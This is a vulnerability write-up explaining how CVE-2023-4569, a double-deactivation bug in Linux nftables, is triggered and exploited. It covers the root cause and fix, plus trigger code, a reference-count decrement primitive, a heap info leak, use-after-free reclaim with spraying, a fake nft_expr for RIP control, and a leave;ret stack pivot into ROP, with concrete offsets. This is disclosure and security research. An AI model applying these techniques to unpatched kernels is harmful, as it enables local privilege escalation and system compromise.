# Exploit detail about CVE-2023-4569
If you want to get some base information about CVE-2023-4569, please read [vulnerability.md](./vulnerability.md) first.

## Background
nftables is a netfilter project that aims to replace the existing {ip,ip6,arp,eb}tables framework, providing a new packet filtering framework for {ip,ip6}tables, a new userspace utility (nft) and A compatibility layer. It uses existing hooks, link tracking system, user space queuing component and netfilter logging subsystem.

It consists of three main components: kernel implementation, libnl netlink communication and nftables user space front-end. The kernel provides a netlink configuration interface and runtime rule set evaluation. libnl contains basic functions for communicating with the kernel. The nftables front end is for user interaction through nft.

nftables implements data packet filtering by using some components like `table`, `set`, `chain`, `rule`.

## Cause anaylysis

In function nft_map_catchall_deactivate, it checks if an elem in set->catchall_list can be deactivated by this:

```
if (!nft_set_elem_active(ext, genmask))
    continue;
```
but it should check like code in function  `nft_set_catchall_flush`:
```
if (!nft_set_elem_active(ext, genmask) ||
   nft_set_elem_mark_busy(ext))
    continue;
```
This makes it possible to call `nft_setelem_data_deactivate` twice for a elem in `set->catchall_list`.

I submitted the suggestion to security@kernel.org, but at that time, the `nft_set_elem_mark_busy` function had been removed in the latest kernel version. So the developers chose the fix in this [commit](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=90e5b3462efa37b8bba82d7c4e63683856e188af). Both methods can fix this vulnerability.

## Triggering the vulnerability

It's easy to trigger it by following this steps:

- Create a set A
- Insert a catchall element B into the set. 
- Flush the set first. Finally function nft_set_catchall_flush will be called. Then the function nft_setelem_data_deactivate will be called in nft_set_catchall_flush, and the parameter will be set element B. We will deactivate some members of set element B. 
- Delete set A. Finally the function nft_map_deactivate will be called. Then the function nft_setelem_data_deactivate will be called in nft_map_deactivate, and the parameter will be set element B. We will deactivate some members of set element B again. 

By the way, we need to send the command of step 3 and step 4 together because we need to avoid set element B being actually released before our step 4. 
This code triggering the vulenrability:
```
    new_set_hashtable(socket, SET_TABLE, tmp_set, NFT_OBJECT_CT_EXPECT, 8);
    new_setelem(socket, SET_TABLE, tmp_set, pad, 0x100, target_obj, NULL, 0, NULL, 0, 1);//create a catchall elem here
    memset(msg_list, 0, sizeof(struct nlmsghdr *)*2);
    msg_list[0] = elem_flush_msg(SET_TABLE, tmp_set);
    msg_list[1] = del_set_msg(SET_TABLE, tmp_set);
    send_msg_list(socket, msg_list, 2);
```
## About spray_tables
It's a function in exploit.c which will be used to spray heap. In nftables, when creating a table, you can let the kernel malloc and fill any size of heap memory by using NFTA_TABLE_USERDATA (the corresponding code is in the function nf_tables_newtable). 

## Exploit it
It's hard to exploit CVE-2023-4569 because there are only operations related to reference counting in the function nft_setelem_data_deactivate: 

```
static void nft_setelem_data_deactivate(const struct net *net,
					const struct nft_set *set,
					struct nft_set_elem *elem)
{
	const struct nft_set_ext *ext = nft_set_elem_ext(set, elem->priv);

	if (nft_set_ext_exists(ext, NFT_SET_EXT_DATA))
		nft_data_release(nft_set_ext_data(ext), set->dtype);
	if (nft_set_ext_exists(ext, NFT_SET_EXT_OBJREF))
		(*nft_set_ext_obj(ext))->use--;
}

void nft_data_release(const struct nft_data *data, enum nft_data_types type)
{
	if (type < NFT_DATA_VERDICT)
		return;
	switch (type) {
	case NFT_DATA_VERDICT:
		return nft_verdict_uninit(data);
	default:
		WARN_ON(1);
	}
}


static void nft_verdict_uninit(const struct nft_data *data)
{
	struct nft_chain *chain;

	switch (data->verdict.code) {
	case NFT_JUMP:
	case NFT_GOTO:
		chain = data->verdict.chain;
		chain->use--;
		break;
	}
}
```
The two structures involved in reference counting are not easy to leak information or hijack RIP when the reference counting is wrong.
After some attempts, I found that information leakage and RIP hijacking can be achieved through two structures in nftables.

I write a simple primitive to trigger the vulnerability (and you can find the primitive in exploit.c many times):

```
		new_set_hashtable(socket, SET_TABLE, tmp_set, NFT_OBJECT_CT_EXPECT, 8);
        new_setelem(socket, SET_TABLE, tmp_set, pad, 0x100, target_obj, NULL, 0, NULL, 0, 1);
        memset(msg_list, 0, sizeof(struct nlmsghdr *)*5);
        msg_list[0] = elem_flush_msg(SET_TABLE, tmp_set);
        msg_list[1] = del_set_msg(SET_TABLE, tmp_set);
        send_msg_list(socket, msg_list, 2);
```
The execution effect of the primitive is to realize `objcet->use--` because it will call `object->use++` once and `object->use--` twice.

### Leak info

Structure `nft_set_elem` is defined as follows:
```
struct nft_set_elem {
	union {
		u32		buf[NFT_DATA_VALUE_MAXLEN / sizeof(u32)];
		struct nft_data	val;
	} key;
	union {
		u32		buf[NFT_DATA_VALUE_MAXLEN / sizeof(u32)];
		struct nft_data	val;
	} key_end;
	union {
		u32		buf[NFT_DATA_VALUE_MAXLEN / sizeof(u32)];
		struct nft_data val;
	} data;
	void			*priv;
};
```
The `priv`  pointer is created by function nft_set_elem_init:

```
void *nft_set_elem_init(const struct nft_set *set,
			const struct nft_set_ext_tmpl *tmpl,
			const u32 *key, const u32 *key_end,
			const u32 *data, u64 timeout, u64 expiration, gfp_t gfp)
{
	struct nft_set_ext *ext;
	void *elem;

	elem = kzalloc(set->ops->elemsize + tmpl->len, gfp);
	if (elem == NULL)
		return ERR_PTR(-ENOMEM);

	ext = nft_set_elem_ext(set, elem);
	nft_set_ext_init(ext, tmpl);

	if (nft_set_ext_exists(ext, NFT_SET_EXT_KEY) &&
	    nft_set_ext_memcpy(tmpl, NFT_SET_EXT_KEY,
			       nft_set_ext_key(ext), key, set->klen) < 0)
		goto err_ext_check;

	if (nft_set_ext_exists(ext, NFT_SET_EXT_KEY_END) &&
	    nft_set_ext_memcpy(tmpl, NFT_SET_EXT_KEY_END,
			       nft_set_ext_key_end(ext), key_end, set->klen) < 0)
		goto err_ext_check;

	if (nft_set_ext_exists(ext, NFT_SET_EXT_DATA) &&
	    nft_set_ext_memcpy(tmpl, NFT_SET_EXT_DATA,
			       nft_set_ext_data(ext), data, set->dlen) < 0)
		goto err_ext_check;

	if (nft_set_ext_exists(ext, NFT_SET_EXT_EXPIRATION)) {
		*nft_set_ext_expiration(ext) = get_jiffies_64() + expiration;
		if (expiration == 0)
			*nft_set_ext_expiration(ext) += timeout;
	}
	if (nft_set_ext_exists(ext, NFT_SET_EXT_TIMEOUT))
		*nft_set_ext_timeout(ext) = timeout;

	return elem;

err_ext_check:
	kfree(elem);

	return ERR_PTR(-EINVAL);
}
```
So the memory pointed to by a `priv` pointer probably looks like the following:

```
					priv ->  ---------------
							 |             |
							 | element data|
							 |			   |
							 ---------------
							 |             |
							 | element ext |
							 |			   |
							 ---------------
```
The size of elem data (`set->ops->elemsize`) depends on the selected set type, for exampleï¼š 

```
	const struct nft_set_type nft_set_hash_type = {
	.features	= NFT_SET_MAP | NFT_SET_OBJECT,
	.ops		= {
		.privsize       = nft_hash_privsize,
		.elemsize	= offsetof(struct nft_hash_elem, ext), # here
		.estimate	= nft_hash_estimate,
		.init		= nft_hash_init,
		.destroy	= nft_hash_destroy,
		.insert		= nft_hash_insert,
		.activate	= nft_hash_activate,
		.deactivate	= nft_hash_deactivate,
		.flush		= nft_hash_flush,
		.remove		= nft_hash_remove,
		.lookup		= nft_hash_lookup,
		.walk		= nft_hash_walk,
		.get		= nft_hash_get,
	},
};
```
The structure `nft_set_ext` (which stands for set extensions) is defined as follows:

```
struct nft_set_ext {
	u8	genmask;
	u8	offset[NFT_SET_EXT_NUM];
	char	data[];
};
```
A `nft_set_ext` may contain the following parts:
```
enum nft_set_extensions {
	NFT_SET_EXT_KEY,
	NFT_SET_EXT_KEY_END,
	NFT_SET_EXT_DATA,
	NFT_SET_EXT_FLAGS,
	NFT_SET_EXT_TIMEOUT,
	NFT_SET_EXT_EXPIRATION,
	NFT_SET_EXT_USERDATA,
	NFT_SET_EXT_EXPRESSIONS,
	NFT_SET_EXT_OBJREF,
	NFT_SET_EXT_NUM
};
```
So the memory of `nft_set_ext` looks like this:
```
						---------------
						|u8 genmask   |
						---------------
						|u8 offset[0] |   <- offset of NFT_SET_EXT_KEY
						---------------
						|u8 offset[1] |   <- offset of NFT_SET_EXT_KEY_END
						---------------
						...				  #if offset[n]==0, it means there's no data for it.
						---------------
						|    data 0   |   <- data of NFT_SET_EXT_KEY(optional)  
						---------------
						|    data 1   |   <- data of NFT_SET_EXT_KEY_END(optional)
						...
```
The data part of NFT_SET_EXT_USERDATA is defined as follows:

```
struct nft_userdata {
	u8			len;
	unsigned char		data[];
};
```
It uses a `u8 len` to describe the length of the data part. If we can modify `len`, we can read data out of bounds by dumping the set element. 

In this case(CVE-2023-4569), the offset of obj->use is 0x30, so I build set elements using these code:
```
new_setelem(socket, SET_TABLE, hash_set, pad, 0xa1, obj_for_leak, &hash_key, 8, NULL, 0,0);
```
It will create a set element of a hashtable set, with NFT_SET_EXT_OBJREF, NFT_SET_EXT_KEY and NFT_SET_EXT_USERDATA. The size of NFT_SET_EXT_KEY is `8` and the size of NFT_SET_EXT_OBJREF is `0xa1`. This will finally create a set element and the offset of `len` of `nft_userdata`  will be 0x30.


So I leak some useful infomation by the following steps.

- 1. Create many objects first.(`object A`,`object B`..., In exploit.c, it's `"obj_for_leak_0"`,`"obj_for_leak_1"`...)
- 2. Create `0x29` set elements wihch use one of the objects created in step 1. We assume we use `object F`(In exploit.c, it's `"obj_for_leak_32"`). Create another set element `element X`(In exploit.c, its' hash key is `0xdeadbeef`) using `object F`(This set element will be used in step 10).After step2, we will set `object F->use = 0x2a` which means `*(object F + 0x30) = 0xa8`(0xa8=0x2a*4) because of the 
the structure of `nft_object`
  - Here is an explanation of why it is 0x29: in step 5 of leak info, when creating the corresponding set elem to retrieve memory, the corresponding udata->size is 0xa0; our ultimate goal is to change udata->size from 0xa0 to 0xfc. After calculation, we need to call nft_obj->use-- 0x29 times to achieve the goal. And udata->size must be 0xa0 because the size of the set elem created in step 5 needs to be the same as the size of the nft_object released in step 4. 
```
struct nft_object {
	struct list_head		list;
	struct rhlist_head		rhlhead;
	struct nft_object_hash_key	key;
	u32				genmask:2, // nft_object->use and genmask together form a u32, and genmask occupies the two lower bits
					use:30;
	u64				handle;
	u16				udlen;
	u8				*udata;
	/* runtime data below here */
	const struct nft_object_ops	*ops ____cacheline_aligned;
	unsigned char			data[]
		__attribute__((aligned(__alignof__(u64))));
};
```


- 3. Call the previously mentioned primitive 0x2a times, finally making `object F->use = 0`
- 4. Delete `object F`
- 5. Create many new set elements to get the heap of `object F` back. These new elements are carefully constructed so that the `len` field representing the length of `NFT_SET_EXT_USERDATA` is exactly at the position of `object F->use`.
- 6. Delete all the set elements we created in step 2 except `element X`. Now the `setelem->udata_len = 0xfc`(The original value is `0xa1-1=0xa0`, which we metioned before)
- 7. Dump all the set elements created in step 5. One of it will leak some usefull heap address. Now we will get heap address of `object E` and `object G`(object created before and after `object F`. In exploit.c, it's `"obj_for_leak_31"` and `"obj_for_leak_33"`)
- 8. Delete all the set elements created in step 5 to free the heap of `object F` again.
- 9. Memory spraying is performed via `spray_tables`. The target cache of the spray is kmalloc-256. Refill the heap of the just-freed `object F` by spraying the heap. We need to fill `object F + 0x20` with `object E + 0x80` (which means we modify `object F->key.name` to point to `&object E->ops`)
- 10. Dump another set element created in step 2. We can leak `object E ->ops` because we overwrite `(*nft_set_ext_obj(ext))->key` by step ix.
  
  ```
  static int nf_tables_fill_setelem(struct sk_buff *skb,
				  const struct nft_set *set,
				  const struct nft_set_elem *elem){
  ...
  if (nft_set_ext_exists(ext, NFT_SET_EXT_OBJREF) &&
	    nla_put_string(skb, NFTA_SET_ELEM_OBJREF,
			   (*nft_set_ext_obj(ext))->key.name) < 0)
		goto nla_put_failure;
  ...
  ```


### Control RIP

The method of controlling RIP is similar to the method of leaking information. I use `NFT_SET_EXT_USERDATA` to leak infomation and I use `NFT_SET_EXT_EXPRESSIONS` to control RIP.
The data part of `NFT_SET_EXT_EXPRESSIONS` is defined as follows:

```

struct nft_set_elem_expr {
	u8				size;
	unsigned char			data[]
		__attribute__((aligned(__alignof__(struct nft_expr))));
};


```
And it will be uesd like this:

```
struct nft_expr {
	const struct nft_expr_ops	*ops;
	unsigned char			data[]
		__attribute__((aligned(__alignof__(u64))));
};

#define nft_setelem_expr_foreach(__expr, __elem_expr, __size)		\
	for (__expr = nft_setelem_expr_at(__elem_expr, 0), __size = 0;	\
	     __size < (__elem_expr)->size;				\
	     __size += (__expr)->ops->size, __expr = ((void *)(__expr)) + (__expr)->ops->size)


static void nft_set_elem_expr_destroy(const struct nft_ctx *ctx,
				      struct nft_set_elem_expr *elem_expr)
{
	struct nft_expr *expr;
	u32 size;

	nft_setelem_expr_foreach(expr, elem_expr, size)
		__nft_set_elem_expr_destroy(ctx, expr);
}
```

So if you change the `size` of `nft_set_elem_expr`, you can build a fake `nft_expr` in `nft_set_ext`. 


It's possible to change the `size` of `nft_set_elem_expr` by using the method which we used in `Leak info`.

I control the RIP by the following steps which is very similar I used for leaking useful information:
- 1. Create a object for ROP(`object X`)(In exploit.c, it's `"obj_for_rop_a"`)
- 2. Create many objects(`object A`,`object B`..., in exploit.c, it's `"obj_for_rop_0"`,`"obj_for_rop_1"`...)
- 3. Create 0x10 set elements wihch use one of the objects created in step 2. We assume we use `object F`(In exploit.c, it's `"obj_for_rop_32"`). After step2, we will set `object F->use = 0x10` which means `*(object F + 0x30) = 0x40`(0x40=0x10*4)
- 4. Call the previously mentioned primitive 0x10 times, finally making `object F->use = 0`
- 5. Delete `object F`
- 6. Create 0x400 new set elements which `NFT_SET_EXT_OBJREF`is `object X` to get the heap of `object F` back. These new elements are carefully constructed so that the `size` field representing the length of `NFT_SET_EXT_EXPRESSIONS` is exactly at the position of `object F->use`. The heap of these set elements looks like this:
  ```
  element data ->       0x0000000000000000      0xffff8881038e58c8   
  element ext  ->       0x4000000000000c04      0x0000002a00003820	  
                        0x0000000000000000      0x0000000000000000      
  nft_set_elem_expr->   0x0000000000000010      0xffffffff82b265a0 <- expr[0]->ops
  expr[0]->data->       0xffff8881023e6e20      0xffff88810252fc00 <- NFT_SET_EXT_OBJREF 
  NFT_SET_EXT_USERDATA  0xffffffff8104d475      0xffffffffffffff00
                		0xffffffffffffffff      0xffffffffffffffff
                      0xffffffffffffffff      0xffffffffffffffff
                      0xffffffffffffffff      0xffffffffffffffff
  ```
- 7. Delete all the set elements we created in step 2. Now we change the `size` of `NFT_SET_EXT_EXPRESSIONS` of a set element which we created in step 5. We will change the `size` from `0x10` to `0xffffffd0`. Now we get a fake `nft_expr` expr[1]. The `ops` of the fake `nft_expr` is `NFT_SET_EXT_OBJREF` and the `data` of the fake `nft_expr` is the first 8 bytes of `nft_userdata`
  ```
  struct nft_userdata {
	u8			len;
	unsigned char		data[];
	};
  ``` 
- 8. Call the previously mentioned primitive 0x400 times, finally making `object X->use = 0`
- 9. Delete `object X`.
- 10. Spray some heap with ROP gadget to get the heap of `object X` back. This will also fill the `ops` of the fake `nft_expr`.
- 11. Dump all the set elements we create in step 5. Finally we will jmp to our ROP gadget.
  
  ```
	static int nf_tables_fill_expr_info(struct sk_buff *skb,
						const struct nft_expr *expr)
	{
		if (nla_put_string(skb, NFTA_EXPR_NAME, expr->ops->type->name))
			goto nla_put_failure;

		if (expr->ops->dump) {
			struct nlattr *data = nla_nest_start_noflag(skb,
									NFTA_EXPR_DATA);
			if (data == NULL)
				goto nla_put_failure;
			if (expr->ops->dump(skb, expr) < 0) //we hijack RIP here
				goto nla_put_failure;
			nla_nest_end(skb, data);
		}
	...

  ```
### ROP detail

The assembly code when calling expr->ops->dump is as follows:

```
	mov     rax, [rbp+0]
	mov     rsi, rbp
	mov     rdi, rbx
	mov     rax, [rax+40h]
	call    __x86_indirect_thunk_rax
```
So the `rbp` is the pointer of the current `nft_expr`, and it will be the start of `NFT_SET_EXT_OBJREF` when it comes to the fake `nft_expr`:

```
element start
  element data ->       0x0000000000000000      0xffff8881038e58c8   
  element ext  ->       0x4000000000000c04      0x0000002a00003820	  
                        0x0000000000000000      0x0000000000000000      
  nft_set_elem_expr->   0x0000000000000010      0xffffffff82b265a0 <- expr[0]->ops
  expr[0]->data->       0xffff8881023e6e20      0xffff88810252fc00 <- NFT_SET_EXT_OBJREF 
  NFT_SET_EXT_USERDATA  0xffffffff8104d475      0xffffffffffffff00
                		0xffffffffffffffff      0xffffffffffffffff
                      0xffffffffffffffff      0xffffffffffffffff
                      0xffffffffffffffff      0xffffffffffffffff

```

The first step of ROP start looks like this:
```
expr->ops->dump(skb, expr)  --> leave ; ret 
```
This will finally makes this happen:

```
rsp = element + 0x48 // mov rsp, rbp  
rbp = *(element + 0x48) //pop rbp  rbp=*(NFT_SET_EXT_OBJREF)
rsp = element + 0x50 
rip = *(element + 0x50) //ret   rip=*(NFT_SET_EXT_USERDATA)
rsp = element + 0x58 
```
The second step of ROP is also:
```
leave; ret
```
After this, the `rsp` will be the value of the `NFT_SET_EXT_OBJREF`. It will point to the `object X`, which we released it in step 8 and filled it with our ROP gadget in step 9.